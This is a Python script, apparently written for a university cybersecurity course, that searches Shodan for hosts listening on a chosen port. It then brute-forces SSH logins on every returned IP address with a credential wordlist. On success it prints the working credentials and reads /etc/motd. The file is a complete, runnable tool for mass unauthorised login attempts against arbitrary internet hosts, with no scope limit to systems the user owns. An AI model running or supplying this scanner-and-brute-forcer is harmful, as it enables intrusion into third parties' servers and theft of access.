#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import paramiko
import sys
from time import sleep
try:
	import shodan
except shodan.APIError as error:
	print("Error: {}".format(error))

__Author__ = '''


██████╗ ██████╗ ██╗   ██╗███████╗███████╗██╗  ██╗███████╗
██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝██║  ██║██╔════╝
██████╔╝██████╔╝██║   ██║███████╗███████╗███████║█████╗
██╔══██╗██╔══██╗██║   ██║╚════██║╚════██║██╔══██║██╔══╝
██████╔╝██║  ██║╚██████╔╝███████║███████║██║  ██║███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝


Author: Michael Scott
Date: 6/27/2019
Created for: CYB339 @ Utica College
Description: Brusshe tries to brute force IP addresses returned from Shodan using a. 
Program requires a port number which will be the Shodan search query and the filepath
of a wordlist.
Functionality is not guaranteed.

'''

SHODAN_API_KEY = "<Insert your API key>"
api = shodan.Shodan(SHODAN_API_KEY)
line = "\n~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***~~~***\n"


def connect(ip_address, port, username, password):
	sshClient = paramiko.SSHClient()
	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	sshClient.load_system_host_keys()
	try:
		sshClient.connect(ip_address, port, username, password)
		print(line)
		print(
			"Success!\nConnection to IP: " +
			ip_address +
			" with credentials: " +
			username +
			":" +
			password)
		print(line)
		print("IP: " + ip_address + "\nMOTD:\n")
		stdin, stdout, stderror = sshClient.exec_command("cat /etc/motd")
		print(stdout.read())
		return True
	except:
		pass


def bruteForcer(port, ip_list, wordlist):
	port = port.lstrip("port: ")
	wordlist = open(wordlist, 'r')
	data = wordlist.readlines()
	wordlist.close()
	print("Forcing list of devices listening on port: " + port + "...")
	for ip_address in ip_list:
		for cred in data:
			user, passwd = cred.split(":")
			passwd = passwd.strip("\n")
			print("Testing: " + ip_address + ": " + user + ":" + passwd)
			success = connect(ip_address, port, user, passwd)
			sleep(0.5)
			if success: break


def shodanSearch(port, wordlist):
	ip_list = []
	print("Searching Shodan for services running on " + port + " ...")
	try:
		results = api.search(port)
		print("Results found: {}".format(results['total']))
		for result in results['matches']:
			print(result['ip_str'])
			ip_list.append(result['ip_str'])
		bruteForcer(port, ip_list, wordlist)
	except shodan.APIError as e:
		print("Error: {}".format(e))


def main():
	parser = argparse.ArgumentParser(
		prog='brusshe.py',
		usage="%(prog)s -p <port number to query> -w <wordlist.txt>",
		description="Search Shodan by port number. If service port is open a bruteforce will be attempted using provided wordlist.")
	parser.add_argument(
		"-p",
		"--port",
		help="Specify port number of desired service (e.g. 22).")
	parser.add_argument("-w", "--wordlist", help="Specify wordlist")
	if len(sys.argv[1:]) < 2:
		print(__Author__)
		parser.print_usage()
		parser.exit()

	args = parser.parse_args()
	port = "port: " + args.port
	wordlist = args.wordlist
	shodanSearch(port, wordlist)


if __name__ == "__main__":
	main()
